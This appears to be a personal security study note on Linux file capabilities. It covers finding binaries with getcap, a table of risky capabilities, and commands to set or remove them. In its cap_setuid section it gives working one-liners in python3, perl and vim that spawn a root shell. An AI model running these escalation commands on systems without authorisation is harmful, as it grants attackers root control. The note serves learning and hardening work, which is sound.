---
tags: [basics, technique, linux, privesc]
---


> [!info] See also: [[General Notes]]

Linux capabilities allow fine-grained privileges to be assigned to executables without granting full root access. Instead of running a binary as root via SUID, you can grant only the specific capability it needs (e.g. `cap_net_bind_service` to bind to port 80).

## Finding Binaries with Capabilities

```bash
# Search common binary paths for set capabilities
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

# Also check the full system (slower)
getcap -r / 2>/dev/null
```

## Common Dangerous Capabilities

| Capability          | Risk                                                                            |
| ------------------- | ------------------------------------------------------------------------------- |
| `cap_setuid`        | Can set UID to 0 → effective root                                               |
| `cap_net_bind_service` | Bind ports < 1024 (low risk by itself)                                       |
| `cap_dac_override`  | Bypass file read/write permission checks                                        |
| `cap_sys_admin`     | Very broad — mount filesystems, set hostname, etc.                              |
| `cap_sys_ptrace`    | Trace/inject into processes → can dump memory of privileged processes           |
| `cap_net_raw`       | Create raw sockets (useful for packet capture/injection)                        |

## PrivEsc via cap_setuid

If a binary has `cap_setuid+ep` set, it can elevate to root:

```bash
# Example: python3 has cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Example: perl has cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Example: vim has cap_setuid (via GTFOBins)
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## Setting / Removing Capabilities

```bash
# Set a capability on a binary
sudo setcap cap_net_bind_service+ep /usr/bin/python3

# Remove all capabilities from a binary
sudo setcap -r /usr/bin/python3

# View capabilities on a single binary
getcap /usr/bin/python3
```

